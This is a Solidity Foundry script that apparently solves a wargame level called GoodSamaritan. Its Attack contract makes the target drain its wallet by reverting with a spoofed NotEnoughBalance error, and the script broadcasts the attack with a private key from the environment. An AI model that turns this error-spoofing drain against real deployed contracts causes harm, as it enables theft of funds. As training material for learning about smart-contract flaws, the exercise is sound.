// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level27.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    error NotEnoughBalance();

    GoodSamaritan public goodSamaritan =
        GoodSamaritan(payable(0xB7E85Eb31256cCDd194ffC6c31A4DC4D2D77768E));

    Wallet public wallet;
    Coin public coin;

    constructor() {
        coin = Coin(goodSamaritan.coin());
        wallet = Wallet(goodSamaritan.wallet());
    }

    function gogo() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) revert NotEnoughBalance();
    }
}

contract GoodSamaritanSolution is Script {
    GoodSamaritan public goodSamaritan =
        GoodSamaritan(payable(0xB7E85Eb31256cCDd194ffC6c31A4DC4D2D77768E));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log(
            "init Coin balances[wallet.address] =>",
            Coin(goodSamaritan.coin()).balances(address(goodSamaritan.wallet()))
        );

        Attack attack = new Attack();
        attack.gogo();

        console.log(
            "after Coin balances[wallet.address] => ",
            Coin(goodSamaritan.coin()).balances(address(goodSamaritan.wallet()))
        );

        console.log(
            "after Coin balances[attack] => ",
            Coin(goodSamaritan.coin()).balances(address(attack))
        );

        vm.stopBroadcast();
    }
}
